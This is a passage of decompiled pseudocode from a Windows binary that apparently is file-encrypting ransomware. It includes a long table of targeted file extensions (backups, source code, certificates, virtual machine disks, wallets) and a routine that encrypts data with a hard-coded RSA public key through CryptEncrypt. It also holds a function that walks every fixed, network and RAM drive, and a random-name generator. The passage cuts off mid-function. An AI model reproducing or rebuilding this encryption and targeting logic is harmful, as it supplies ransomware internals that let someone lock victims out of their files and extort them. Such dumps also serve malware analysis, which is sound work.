  sub_40C390(&dword_45384C, (int)v207, Block);
  v209 = -1;
  sub_401970((char **)Block);
  sub_4019D0((char **)Block, "tiff");
  v209 = 64;
  sub_40C390(&dword_45384C, (int)v207, Block);
  v209 = -1;
  sub_401970((char **)Block);
  sub_4019D0((char **)Block, "tif");
  v209 = 65;
  sub_40C390(&dword_45384C, (int)v207, Block);
  v209 = -1;
  sub_401970((char **)Block);
  sub_4019D0(v203, "png");
  v209 = 66;
  sub_40C390(&dword_45384C, (int)v207, v203);
  v209 = -1;
  sub_401970(v203);
  sub_4019D0(v202, "bmp");
  v209 = 67;
  sub_40C390(&dword_45384C, (int)v207, v202);
  v209 = -1;
  sub_401970(v202);
  sub_4019D0(v201, "svg");
  v209 = 68;
  sub_40C390(&dword_45384C, (int)v207, v201);
  v209 = -1;
  sub_401970(v201);
  sub_4019D0(v200, "mp4");
  v209 = 69;
  sub_40C390(&dword_45384C, (int)v207, v200);
  v209 = -1;
  sub_401970(v200);
  sub_4019D0(v199, "mov");
  v209 = 70;
  sub_40C390(&dword_45384C, (int)v207, v199);
  v209 = -1;
  sub_401970(v199);
  sub_4019D0(v198, "gif");
  v209 = 71;
  sub_40C390(&dword_45384C, (int)v207, v198);
  v209 = -1;
  sub_401970(v198);
  sub_4019D0(v197, "avi");
  v209 = 72;
  sub_40C390(&dword_45384C, (int)v207, v197);
  v209 = -1;
  sub_401970(v197);
  sub_4019D0(v196, "wmv");
  v209 = 73;
  sub_40C390(&dword_45384C, (int)v207, v196);
  v209 = -1;
  sub_401970(v196);
  sub_4019D0(v195, "sfk");
  v209 = 74;
  sub_40C390(&dword_45384C, (int)v207, v195);
  v209 = -1;
  sub_401970(v195);
  sub_4019D0(v194, "ico");
  v209 = 75;
  sub_40C390(&dword_45384C, (int)v207, v194);
  v209 = -1;
  sub_401970(v194);
  sub_4019D0(v193, "zip");
  v209 = 76;
  sub_40C390(&dword_45384C, (int)v207, v193);
  v209 = -1;
  sub_401970(v193);
  sub_4019D0(v192, "rar");
  v209 = 77;
  sub_40C390(&dword_45384C, (int)v207, v192);
  v209 = -1;
  sub_401970(v192);
  sub_4019D0(v191, "7z");
  v209 = 78;
  sub_40C390(&dword_45384C, (int)v207, v191);
  v209 = -1;
  sub_401970(v191);
  sub_4019D0(v190, "tar");
  v209 = 79;
  sub_40C390(&dword_45384C, (int)v207, v190);
  v209 = -1;
  sub_401970(v190);
  sub_4019D0(v189, "backup");
  v209 = 80;
  sub_40C390(&dword_45384C, (int)v207, v189);
  v209 = -1;
  sub_401970(v189);
  sub_4019D0(v188, "bak");
  v209 = 81;
  sub_40C390(&dword_45384C, (int)v207, v188);
  v209 = -1;
  sub_401970(v188);
  sub_4019D0(v187, "ms11");
  v209 = 82;
  sub_40C390(&dword_45384C, (int)v207, v187);
  v209 = -1;
  sub_401970(v187);
  sub_4019D0(v186, "ms11 (Security copy)");
  v209 = 83;
  sub_40C390(&dword_45384C, (int)v207, v186);
  v209 = -1;
  sub_401970(v186);
  sub_4019D0(v185, "md");
  v209 = 84;
  sub_40C390(&dword_45384C, (int)v207, v185);
  v209 = -1;
  sub_401970(v185);
  sub_4019D0(v184, "veg");
  v209 = 85;
  sub_40C390(&dword_45384C, (int)v207, v184);
  v209 = -1;
  sub_401970(v184);
  sub_4019D0(v183, "pproj");
  v209 = 86;
  sub_40C390(&dword_45384C, (int)v207, v183);
  v209 = -1;
  sub_401970(v183);
  sub_4019D0(v182, "prproj");
  v209 = 87;
  sub_40C390(&dword_45384C, (int)v207, v182);
  v209 = -1;
  sub_401970(v182);
  sub_4019D0(v181, "ps1");
  v209 = 88;
  sub_40C390(&dword_45384C, (int)v207, v181);
  v209 = -1;
  sub_401970(v181);
  sub_4019D0(v180, "json");
  v209 = 89;
  sub_40C390(&dword_45384C, (int)v207, v180);
  v209 = -1;
  sub_401970(v180);
  sub_4019D0(v179, "php");
  v209 = 90;
  sub_40C390(&dword_45384C, (int)v207, v179);
  v209 = -1;
  sub_401970(v179);
  sub_4019D0(v178, "c");
  v209 = 91;
  sub_40C390(&dword_45384C, (int)v207, v178);
  v209 = -1;
  sub_401970(v178);
  sub_4019D0(v177, "h");
  v209 = 92;
  sub_40C390(&dword_45384C, (int)v207, v177);
  v209 = -1;
  sub_401970(v177);
  sub_4019D0(v176, "cpp");
  v209 = 93;
  sub_40C390(&dword_45384C, (int)v207, v176);
  v209 = -1;
  sub_401970(v176);
  sub_4019D0(v175, "asm");
  v209 = 94;
  sub_40C390(&dword_45384C, (int)v207, v175);
  v209 = -1;
  sub_401970(v175);
  sub_4019D0(v174, "py");
  v209 = 95;
  sub_40C390(&dword_45384C, (int)v207, v174);
  v209 = -1;
  sub_401970(v174);
  sub_4019D0(v173, "cs");
  v209 = 96;
  sub_40C390(&dword_45384C, (int)v207, v173);
  v209 = -1;
  sub_401970(v173);
  sub_4019D0(v172, "bat");
  v209 = 97;
  sub_40C390(&dword_45384C, (int)v207, v172);
  v209 = -1;
  sub_401970(v172);
  sub_4019D0(v171, "vbs");
  v209 = 98;
  sub_40C390(&dword_45384C, (int)v207, v171);
  v209 = -1;
  sub_401970(v171);
  sub_4019D0(v170, "class");
  v209 = 99;
  sub_40C390(&dword_45384C, (int)v207, v170);
  v209 = -1;
  sub_401970(v170);
  sub_4019D0(v169, "vb");
  v209 = 100;
  sub_40C390(&dword_45384C, (int)v207, v169);
  v209 = -1;
  sub_401970(v169);
  sub_4019D0(v168, "java");
  v209 = 101;
  sub_40C390(&dword_45384C, (int)v207, v168);
  v209 = -1;
  sub_401970(v168);
  sub_4019D0(v167, "jar");
  v209 = 102;
  sub_40C390(&dword_45384C, (int)v207, v167);
  v209 = -1;
  sub_401970(v167);
  sub_4019D0(v166, "asp");
  v209 = 103;
  sub_40C390(&dword_45384C, (int)v207, v166);
  v209 = -1;
  sub_401970(v166);
  sub_4019D0(v165, "js");
  v209 = 104;
  sub_40C390(&dword_45384C, (int)v207, v165);
  v209 = -1;
  sub_401970(v165);
  sub_4019D0(v164, "lib");
  v209 = 105;
  sub_40C390(&dword_45384C, (int)v207, v164);
  v209 = -1;
  sub_401970(v164);
  sub_4019D0(v163, "pas");
  v209 = 106;
  sub_40C390(&dword_45384C, (int)v207, v163);
  v209 = -1;
  sub_401970(v163);
  sub_4019D0(v162, "tiff");
  v209 = 107;
  sub_40C390(&dword_45384C, (int)v207, v162);
  v209 = -1;
  sub_401970(v162);
  sub_4019D0(v161, "tif");
  v209 = 108;
  sub_40C390(&dword_45384C, (int)v207, v161);
  v209 = -1;
  sub_401970(v161);
  sub_4019D0(v160, "cgm");
  v209 = 109;
  sub_40C390(&dword_45384C, (int)v207, v160);
  v209 = -1;
  sub_401970(v160);
  sub_4019D0(v159, "nef");
  v209 = 110;
  sub_40C390(&dword_45384C, (int)v207, v159);
  v209 = -1;
  sub_401970(v159);
  sub_4019D0(v158, "crt");
  v209 = 111;
  sub_40C390(&dword_45384C, (int)v207, v158);
  v209 = -1;
  sub_401970(v158);
  sub_4019D0(v157, "csr");
  v209 = 112;
  sub_40C390(&dword_45384C, (int)v207, v157);
  v209 = -1;
  sub_401970(v157);
  sub_4019D0(v156, "p12");
  v209 = 113;
  sub_40C390(&dword_45384C, (int)v207, v156);
  v209 = -1;
  sub_401970(v156);
  sub_4019D0(v155, "pem");
  v209 = 114;
  sub_40C390(&dword_45384C, (int)v207, v155);
  v209 = -1;
  sub_401970(v155);
  sub_4019D0(v154, "vmx");
  v209 = 115;
  sub_40C390(&dword_45384C, (int)v207, v154);
  v209 = -1;
  sub_401970(v154);
  sub_4019D0(v153, "vmdk");
  v209 = 116;
  sub_40C390(&dword_45384C, (int)v207, v153);
  v209 = -1;
  sub_401970(v153);
  sub_4019D0(v152, "vdi");
  v209 = 117;
  sub_40C390(&dword_45384C, (int)v207, v152);
  v209 = -1;
  sub_401970(v152);
  sub_4019D0(v151, "qcow2");
  v209 = 118;
  sub_40C390(&dword_45384C, (int)v207, v151);
  v209 = -1;
  sub_401970(v151);
  sub_4019D0(v150, "vbox");
  v209 = 119;
  sub_40C390(&dword_45384C, (int)v207, v150);
  v209 = -1;
  sub_401970(v150);
  sub_4019D0(v149, "wallet");
  v209 = 120;
  sub_40C390(&dword_45384C, (int)v207, v149);
  v209 = -1;
  sub_401970(v149);
  sub_4019D0(v148, "dat");
  v209 = 121;
  sub_40C390(&dword_45384C, (int)v207, v148);
  v209 = -1;
  sub_401970(v148);
  sub_4019D0(v147, "cfg");
  v209 = 122;
  sub_40C390(&dword_45384C, (int)v207, v147);
  v209 = -1;
  sub_401970(v147);
  sub_4019D0(v146, "config");
  v209 = 123;
  sub_40C390(&dword_45384C, (int)v207, v146);
  v209 = -1;
  sub_401970(v146);
  sub_4019D0(v145, "saturn");
  v209 = 124;
  sub_40C390(&dword_453844, (int)v207, v145);
  sub_401970(v145);
}
// 4046DC: variable 'v0' is possibly undefined
// 404767: variable 'v3' is possibly undefined
// 4047F2: variable 'v6' is possibly undefined
// 40487D: variable 'v9' is possibly undefined
// 404908: variable 'v12' is possibly undefined
// 404993: variable 'v15' is possibly undefined
// 404A1E: variable 'v18' is possibly undefined
// 404AA9: variable 'v21' is possibly undefined
// 404B34: variable 'v24' is possibly undefined
// 404BBF: variable 'v27' is possibly undefined
// 404C4A: variable 'v30' is possibly undefined
// 404CD5: variable 'v33' is possibly undefined
// 404D60: variable 'v36' is possibly undefined
// 404DEB: variable 'v39' is possibly undefined
// 404E76: variable 'v42' is possibly undefined
// 404F01: variable 'v45' is possibly undefined
// 404F8C: variable 'v48' is possibly undefined
// 405017: variable 'v51' is possibly undefined
// 4050A2: variable 'v54' is possibly undefined
// 40512D: variable 'v57' is possibly undefined
// 4051B8: variable 'v60' is possibly undefined
// 405243: variable 'v63' is possibly undefined
// 4052CE: variable 'v66' is possibly undefined
// 405359: variable 'v69' is possibly undefined
// 4053E4: variable 'v72' is possibly undefined
// 40546F: variable 'v75' is possibly undefined
// 4054FA: variable 'v78' is possibly undefined
// 405585: variable 'v81' is possibly undefined
// 405610: variable 'v84' is possibly undefined
// 40569B: variable 'v87' is possibly undefined
// 405726: variable 'v90' is possibly undefined
// 4057B1: variable 'v93' is possibly undefined
// 40583C: variable 'v96' is possibly undefined
// 4058C7: variable 'v99' is possibly undefined
// 405952: variable 'v102' is possibly undefined
// 4059DD: variable 'v105' is possibly undefined
// 405A68: variable 'v108' is possibly undefined
// 405AF3: variable 'v111' is possibly undefined
// 405B7E: variable 'v114' is possibly undefined
// 405C09: variable 'v117' is possibly undefined
// 405C94: variable 'v120' is possibly undefined
// 405D1F: variable 'v123' is possibly undefined
// 405DAA: variable 'v126' is possibly undefined
// 405E35: variable 'v129' is possibly undefined
// 405EC0: variable 'v132' is possibly undefined
// 405F4B: variable 'v135' is possibly undefined
// 405FD6: variable 'v138' is possibly undefined
// 406061: variable 'v141' is possibly undefined
// 4060EC: variable 'v144' is possibly undefined
// 453848: using guessed type int dword_453848;
// 453850: using guessed type int dword_453850;
// 404600: using guessed type char var_14[4];

//----- (00407270) --------------------------------------------------------
void __stdcall sub_407270(
        BYTE *pbData,
        int a2,
        DWORD *pdwDataLen,
        HCRYPTKEY hKey,
        char *Block,
        int a6,
        int a7,
        int a8,
        int a9,
        unsigned int a10,
        _DWORD *a11,
        int a12,
        int a13,
        int a14,
        int a15,
        unsigned int a16)
{
  char *v16; // ecx
  unsigned int v17; // eax
  _DWORD *v18; // ecx
  unsigned int v19; // eax
  char *p_Block; // eax
  int v21; // [esp-8h] [ebp-E8h]
  int v22; // [esp-4h] [ebp-E4h]
  _BYTE v23[24]; // [esp+0h] [ebp-E0h] BYREF
  int v24[47]; // [esp+18h] [ebp-C8h] BYREF
  int v25; // [esp+DCh] [ebp-4h]

  v24[46] = (int)v23;
  v25 = 1;
  if ( CryptEncrypt(hKey, 0, 1, 0, pbData, pdwDataLen, 0x100u) )
  {
    LOBYTE(v25) = 2;
    memset(v24, 0, 0xB0u);
    p_Block = (char *)&Block;
    if ( a10 >= 0x10 )
      p_Block = Block;
    sub_40B670(v24, p_Block, 32, v21, v22);
    *(int *)((char *)v24 + *(_DWORD *)(v24[0] + 4)) = (int)&std::ofstream::`vftable';
    *(_DWORD *)&v23[*(_DWORD *)(v24[0] + 4) + 20] = *(_DWORD *)(v24[0] + 4) - 104;
    LOBYTE(v25) = 3;
    sub_40A8D0((char *)v24, (int)pbData, *pdwDataLen);
    sub_407870(v24);
  }
  if ( a10 >= 0x10 )
  {
    v16 = Block;
    if ( a10 + 1 >= 0x1000 )
    {
      if ( ((unsigned __int8)Block & 0x1F) != 0 )
        goto LABEL_19;
      v17 = *((_DWORD *)Block - 1);
      if ( v17 >= (unsigned int)Block || (unsigned int)&Block[-v17] < 4 || (unsigned int)&Block[-v17] > 0x23 )
        goto LABEL_19;
      v16 = (char *)*((_DWORD *)Block - 1);
    }
    j__free(v16);
  }
  LOBYTE(Block) = 0;
  a10 = 15;
  a9 = 0;
  if ( a16 < 0x10 )
    return;
  v18 = a11;
  if ( a16 + 1 >= 0x1000 )
  {
    if ( ((unsigned __int8)a11 & 0x1F) == 0 )
    {
      v19 = *(a11 - 1);
      if ( v19 < (unsigned int)a11 && (unsigned int)a11 - v19 >= 4 && (unsigned int)a11 - v19 <= 0x23 )
      {
        v18 = (_DWORD *)*(a11 - 1);
        goto LABEL_17;
      }
    }
LABEL_19:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_17:
  j__free(v18);
}
// 40739F: variable 'v21' is possibly undefined
// 40739F: variable 'v22' is possibly undefined
// 442330: using guessed type void *std::ofstream::`vftable';

//----- (00407400) --------------------------------------------------------
void __userpurge sub_407400(
        int a1@<ebp>,
        _DWORD *a2,
        int a3,
        int a4,
        int a5,
        size_t a6,
        unsigned int a7,
        char *a8,
        int a9,
        int a10,
        int a11,
        int a12,
        unsigned int a13,
        char *a14,
        int a15,
        int a16,
        int a17,
        int a18,
        unsigned int a19)
{
  BYTE *v19; // eax
  const BYTE *v20; // edi
  _DWORD **v21; // eax
  char **v22; // eax
  char **v23; // eax
  char *v24; // eax
  int v25; // ecx
  char *v26; // ecx
  char *v27; // eax
  _DWORD *v28; // ecx
  unsigned int v29; // eax
  char *v30; // ecx
  unsigned int v31; // eax
  char *v32; // ecx
  unsigned int v33; // eax
  char *v34[6]; // [esp-1ECh] [ebp-1F8h] BYREF
  _DWORD *v35[5]; // [esp-1D4h] [ebp-1E0h] BYREF
  size_t v36; // [esp-1C0h] [ebp-1CCh]
  char *v37[6]; // [esp-1B0h] [ebp-1BCh] BYREF
  __int128 v38; // [esp-198h] [ebp-1A4h] BYREF
  __int64 v39; // [esp-188h] [ebp-194h]
  char *v40[6]; // [esp-17Ch] [ebp-188h] BYREF
  int v41; // [esp-164h] [ebp-170h]
  struct _CERT_PUBLIC_KEY_INFO *v42; // [esp-160h] [ebp-16Ch] BYREF
  DWORD v43; // [esp-15Ch] [ebp-168h] BYREF
  char *v44[6]; // [esp-158h] [ebp-164h] BYREF
  DWORD v45; // [esp-140h] [ebp-14Ch] BYREF
  char *v46[4]; // [esp-13Ch] [ebp-148h] BYREF
  int v47; // [esp-12Ch] [ebp-138h]
  unsigned int v48; // [esp-128h] [ebp-134h]
  char *v49; // [esp-124h] [ebp-130h] BYREF
  HCRYPTKEY v50; // [esp-120h] [ebp-12Ch] BYREF
  HCRYPTPROV v51; // [esp-11Ch] [ebp-128h] BYREF
  char v52[264]; // [esp-118h] [ebp-124h] BYREF
  int *v53; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h]
  void *v55; // [esp-8h] [ebp-14h]
  int v56; // [esp-4h] [ebp-10h]
  int v57; // [esp+0h] [ebp-Ch]
  int v58; // [esp+4h] [ebp-8h]
  int v59; // [esp+8h] [ebp-4h] BYREF
  int retaddr; // [esp+Ch] [ebp+0h]

  v57 = a1;
  v58 = retaddr;
  v56 = -1;
  v55 = &loc_433A3A;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v53 = &v59;
  v41 = 0;
  v56 = 2;
  v47 = 0;
  v48 = 15;
  LOBYTE(v46[0]) = 0;
  sub_401D10(v46, "nEcU0UXVhEua1FgY", 0x10u);
  LOBYTE(v56) = 3;
  CryptStringToBinaryA(
    "-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAm/W2C6rMwtDNG/RsSKr3D4OviH3FZT8IP79h7GYRYACC5Q"
    "hJ1CRkACFE+i2wVP7VnykyD+nW0WR9+3OY8NLUqDolutAUtBGYbYdUODPZ8Mzc1+CM1WMRTv8n18MexxOsfRU3pcC94vho/OCqNbqf6EV7GQwBC5aYzK"
    "vsmWLoXw+PEzycreMFcQVYvcxxqxCkxsuWcWRfrOM04AsGtKb35Iitp1JDOkT70ys8TvyHVx58OP/0TClC2DtivuYbjeqU2F6CmmRD1J0bsC+Lc2U2hj"
    "j2UFsefPhvw+toXWrnPzafJ2jkFDFK4v7ToVDaU5KEhqGTDz/H+qv51SglgcVcvQIDAQAB-----END PUBLIC KEY-----",
    0,
    0,
    0,
    &v43,
    0,
    0);
  v19 = (BYTE *)unknown_libname_5(v43);
  v51 = 0;
  v20 = v19;
  v50 = 0;
  CryptStringToBinaryA(
    "-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAm/W2C6rMwtDNG/RsSKr3D4OviH3FZT8IP79h7GYRYACC5Q"
    "hJ1CRkACFE+i2wVP7VnykyD+nW0WR9+3OY8NLUqDolutAUtBGYbYdUODPZ8Mzc1+CM1WMRTv8n18MexxOsfRU3pcC94vho/OCqNbqf6EV7GQwBC5aYzK"
    "vsmWLoXw+PEzycreMFcQVYvcxxqxCkxsuWcWRfrOM04AsGtKb35Iitp1JDOkT70ys8TvyHVx58OP/0TClC2DtivuYbjeqU2F6CmmRD1J0bsC+Lc2U2hj"
    "j2UFsefPhvw+toXWrnPzafJ2jkFDFK4v7ToVDaU5KEhqGTDz/H+qv51SglgcVcvQIDAQAB-----END PUBLIC KEY-----",
    0,
    0,
    v19,
    &v43,
    0,
    0);
  if ( CryptDecodeObjectEx(1u, (LPCSTR)8, v20, v43, 0x8000u, 0, &v42, &v45)
    && CryptAcquireContextA(&v51, 0, 0, 1u, 0xF0000000)
    && CryptImportPublicKeyInfo(v51, 1u, v42, &v50) )
  {
    LocalFree(v42);
    LOBYTE(v56) = 4;
    v40[4] = 0;
    v40[5] = (char *)15;
    LOBYTE(v40[0]) = 0;
    v41 = 1;
    sub_40C620(v40, a6 + 1);
    v21 = &a2;
    v36 = a6;
    if ( a7 >= 0x10 )
      v21 = (_DWORD **)a2;
    sub_4036D0(v40, v21, v36);
    sub_4036D0(v40, "-", 1u);
    v22 = (char **)sub_40C470((int)v37, v40, (size_t **)&a14);
    LOBYTE(v56) = 5;
    v23 = sub_4036D0(v22, "-", 1u);
    v39 = 0i64;
    v41 = 3;
    v38 = *(_OWORD *)v23;
    v39 = *((_QWORD *)v23 + 2);
    v23[4] = 0;
    v23[5] = (char *)15;
    *(_BYTE *)v23 = 0;
    LOBYTE(v56) = 6;
    sub_40C470((int)v44, (char **)&v38, (size_t **)v46);
    sub_401970((char **)&v38);
    sub_401970(v37);
    LOBYTE(v56) = 10;
    sub_401970(v40);
    v24 = (char *)v44;
    if ( v44[5] >= (char *)0x10 )
      v24 = v44[0];
    sub_4039C0(v52, 0x100u, v24);
    v49 = v44[4] + 1;
    v41 = (int)v35;
    sub_401A10(v35, &a14);
    LOBYTE(v56) = 11;
    sub_401A10(v34, &a8);
    LOBYTE(v56) = 10;
    sub_407270(
      (BYTE *)v52,
      v25,
      (DWORD *)&v49,
      v50,
      v34[0],
      (int)v34[1],
      (int)v34[2],
      (int)v34[3],
      (int)v34[4],
      (unsigned int)v34[5],
      v35[0],
      (int)v35[1],
      (int)v35[2],
      (int)v35[3],
      (int)v35[4],
      v36);
    sub_401970(v44);
    sub_401970(v46);
  }
  else
  {
    if ( v48 >= 0x10 )
    {
      v26 = v46[0];
      if ( v48 + 1 >= 0x1000 )
      {
        if ( ((int)v46[0] & 0x1F) != 0 )
          goto LABEL_43;
        v27 = (char *)*((_DWORD *)v46[0] - 1);
        if ( v27 >= v46[0] || (unsigned int)(v46[0] - v27) < 4 || (unsigned int)(v46[0] - v27) > 0x23 )
          goto LABEL_43;
        v26 = (char *)*((_DWORD *)v46[0] - 1);
      }
      j__free(v26);
    }
    v47 = 0;
    v48 = 15;
    LOBYTE(v46[0]) = 0;
  }
  if ( a7 >= 0x10 )
  {
    v28 = a2;
    if ( a7 + 1 >= 0x1000 )
    {
      if ( ((unsigned __int8)a2 & 0x1F) != 0 )
        goto LABEL_43;
      v29 = *(a2 - 1);
      if ( v29 >= (unsigned int)a2 || (unsigned int)a2 - v29 < 4 || (unsigned int)a2 - v29 > 0x23 )
        goto LABEL_43;
      v28 = (_DWORD *)*(a2 - 1);
    }
    j__free(v28);
  }
  a6 = 0;
  a7 = 15;
  LOBYTE(a2) = 0;
  if ( a13 >= 0x10 )
  {
    v30 = a8;
    if ( a13 + 1 >= 0x1000 )
    {
      if ( ((unsigned __int8)a8 & 0x1F) != 0 )
        goto LABEL_43;
      v31 = *((_DWORD *)a8 - 1);
      if ( v31 >= (unsigned int)a8 || (unsigned int)&a8[-v31] < 4 || (unsigned int)&a8[-v31] > 0x23 )
        goto LABEL_43;
      v30 = (char *)*((_DWORD *)a8 - 1);
    }
    j__free(v30);
  }
  a12 = 0;
  a13 = 15;
  LOBYTE(a8) = 0;
  if ( a19 < 0x10 )
    return;
  v32 = a14;
  if ( a19 + 1 >= 0x1000 )
  {
    if ( ((unsigned __int8)a14 & 0x1F) == 0 )
    {
      v33 = *((_DWORD *)a14 - 1);
      if ( v33 < (unsigned int)a14 && (unsigned int)&a14[-v33] >= 4 && (unsigned int)&a14[-v33] <= 0x23 )
      {
        v32 = (char *)*((_DWORD *)a14 - 1);
        goto LABEL_41;
      }
    }
LABEL_43:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_41:
  j__free(v32);
}
// 407400: could not find valid save-restore pair for ebp
// 4076E5: variable 'v25' is possibly undefined
// 414B29: using guessed type int __cdecl unknown_libname_5(_DWORD);
// 407400: using guessed type char *anonymous_1;
// 407400: using guessed type _DWORD *anonymous_2;

//----- (00407870) --------------------------------------------------------
void __thiscall sub_407870(_DWORD *this)
{
  struct std::ios_base *v1; // esi

  v1 = (struct std::ios_base *)(this + 26);
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*this + 4) - 104) = &std::ofstream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*this + 4) - 108) = *(_DWORD *)(*this + 4) - 104;
  sub_40A7C0(this + 1);
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 26) + 4) - 104) = &std::ostream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 26) + 4) - 108) = *(_DWORD *)(*((_DWORD *)v1 - 26) + 4) - 8;
  *(_DWORD *)v1 = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(v1);
}
// 435FE0: using guessed type void *std::ios_base::`vftable';
// 436070: using guessed type void *std::ostream::`vftable';
// 442330: using guessed type void *std::ofstream::`vftable';

//----- (00407900) --------------------------------------------------------
void __thiscall sub_407900(int *this)
{
  DWORD LogicalDriveStringsA; // ebx
  CHAR *v2; // eax
  CHAR *v3; // esi
  int *v4; // ebx
  UINT DriveTypeA; // eax
  void *v6; // ecx
  void *v7; // eax
  int v8; // [esp+0h] [ebp-48h] BYREF
  void *Block[5]; // [esp+18h] [ebp-30h] BYREF
  unsigned int v10; // [esp+2Ch] [ebp-1Ch]
  void *v11; // [esp+30h] [ebp-18h]
  int *v12; // [esp+34h] [ebp-14h]
  int *v13; // [esp+38h] [ebp-10h]
  int v14; // [esp+44h] [ebp-4h]

  v13 = &v8;
  v12 = this;
  v14 = 0;
  LogicalDriveStringsA = GetLogicalDriveStringsA(0, 0);
  v2 = (CHAR *)malloc(__CFADD__(LogicalDriveStringsA, 1) ? -1 : LogicalDriveStringsA + 1);
  v3 = v2;
  v11 = v2;
  if ( v2 )
  {
    GetLogicalDriveStringsA(LogicalDriveStringsA, v2);
    v4 = v12;
    while ( *v3 )
    {
      DriveTypeA = GetDriveTypeA(v3);
      if ( DriveTypeA == 3 || DriveTypeA == 4 || DriveTypeA == 6 )
      {
        Block[4] = 0;
        v10 = 15;
        LOBYTE(Block[0]) = 0;
        sub_401D10((char **)Block, v3, strlen(v3));
        LOBYTE(v14) = 1;
        sub_409C20(v4, (int)Block);
        LOBYTE(v14) = 0;
        if ( v10 >= 0x10 )
        {
          v6 = Block[0];
          if ( v10 + 1 >= 0x1000 )
          {
            if ( ((int)Block[0] & 0x1F) != 0
              || (v7 = (void *)*((_DWORD *)Block[0] - 1), v7 >= Block[0])
              || (unsigned int)(Block[0] - v7) < 4
              || (unsigned int)(Block[0] - v7) > 0x23 )
            {
              _invalid_parameter_noinfo_noreturn();
            }
            v6 = (void *)*((_DWORD *)Block[0] - 1);
          }
          j__free(v6);
        }
      }
      v3 += lstrlenA(v3) + 1;
    }
    free(v11);
  }
}

//----- (00407A60) --------------------------------------------------------
int __fastcall sub_407A60(unsigned int a1)
{
  int v1; // esi
  void *v2; // ecx
  void *v3; // eax
  unsigned int v4; // edx
  int i; // ecx
  int v6; // ebx
  int v7; // ebx
  unsigned int v8; // edx
  unsigned int v9; // esi
  unsigned int v10; // ecx
  unsigned int v11; // eax
  void **v12; // eax
  void *v13; // ecx
  void *v14; // eax
  void *Block[5]; // [esp+18h] [ebp-13D8h] BYREF
  unsigned int v17; // [esp+2Ch] [ebp-13C4h]
  unsigned int v18; // [esp+30h] [ebp-13C0h]
  int v19; // [esp+34h] [ebp-13BCh]
  unsigned int v20; // [esp+38h] [ebp-13B8h]
  int v21; // [esp+3Ch] [ebp-13B4h]
  int v22; // [esp+40h] [ebp-13B0h] BYREF
  int v23[1249]; // [esp+44h] [ebp-13ACh]
  void *v24[4]; // [esp+13C8h] [ebp-28h] BYREF
  int v25; // [esp+13D8h] [ebp-18h]
  unsigned int v26; // [esp+13DCh] [ebp-14h]
  int v27; // [esp+13ECh] [ebp-4h]

  v1 = a1;
  v18 = a1;
  v20 = a1;
  v27 = 0;
  v19 = 0;
  v25 = 0;
  v26 = 15;
  LOBYTE(v24[0]) = 0;
  sub_401D10((char **)v24, "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", 0x3Eu);
  v27 = 1;
  Block[4] = 0;
  v17 = 15;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, (void *)Locale, 0);
  LOBYTE(v27) = 2;
  std::_Random_device();
  LOBYTE(v27) = 1;
  if ( v17 >= 0x10 )
  {
    v2 = Block[0];
    if ( v17 + 1 >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_14;
      v3 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v3 >= Block[0] || (unsigned int)(Block[0] - v3) < 4 || (unsigned int)(Block[0] - v3) > 0x23 )
        goto LABEL_14;
      v2 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v2);
  }
  v4 = std::_Random_device();
  v23[1248] = -1;
  v23[0] = v4;
  for ( i = 1; i < 624; ++i )
  {
    v4 = i + 1812433253 * (v4 ^ (v4 >> 30));
    v23[i] = v4;
  }
  v6 = v25;
  *(_DWORD *)(v1 + 16) = 0;
  v7 = v6 - 1;
  *(_DWORD *)(v1 + 20) = 15;
  v22 = 624;
  *(_BYTE *)v1 = 0;
  sub_401D10((char **)v1, (void *)Locale, 0);
  v19 = 1;
  v21 = 4;
  do
  {
    if ( v7 == -1 )
    {
      v8 = sub_40CB80(&v22);
    }
    else
    {
      v9 = v7 + 1;
      v20 = v7 + 1;
      while ( 1 )
      {
        v10 = 0;
        v11 = 0;
        if ( v7 )
        {
          v10 = sub_40CB80(&v22);
          v11 = -1;
        }
        if ( v10 / v20 < v11 / v9 || v11 % v9 == v7 )
          break;
        v9 = v7 + 1;
      }
      v1 = v18;
      v8 = v10 % (v7 + 1);
    }
    v12 = v24;
    if ( v26 >= 0x10 )
      v12 = (void **)v24[0];
    sub_401B40((char *)v1, *((_BYTE *)v12 + v8));
    --v21;
  }
  while ( v21 );
  if ( v26 >= 0x10 )
  {
    v13 = v24[0];
    if ( v26 + 1 < 0x1000 )
    {
LABEL_32:
      j__free(v13);
      return v1;
    }
    if ( ((int)v24[0] & 0x1F) == 0 )
    {
      v14 = (void *)*((_DWORD *)v24[0] - 1);
      if ( v14 < v24[0] && (unsigned int)(v24[0] - v14) >= 4 && (unsigned int)(v24[0] - v14) <= 0x23 )
      {
        v13 = (void *)*((_DWORD *)v24[0] - 1);
        goto LABEL_32;
      }
    }
LABEL_14:
    _invalid_parameter_noinfo_noreturn();
  }
  return v1;
}

//----- (00407CE0) --------------------------------------------------------
char *__usercall sub_407CE0@<eax>(_DWORD *a1@<edx>, char *a2@<ecx>, int a3@<ebp>)
{
  _DWORD *v3; // edi
  _DWORD *v4; // ecx
  bool v5; // cf
  int v6; // eax
  int v7; // eax
  int v8; // esi
  int v9; // eax
  char *v10; // esi
  int v11; // eax
  size_t v12; // esi
  char **v13; // ecx
  int v14; // eax
  char *v15; // esi
  int v16; // eax
  __int128 v17; // xmm0
  char *v18; // ecx
  char *v19; // eax
  char *v20; // ecx
  char *v21; // eax
  char *v23[5]; // [esp-48h] [ebp-54h] BYREF
  unsigned int v24; // [esp-34h] [ebp-40h]
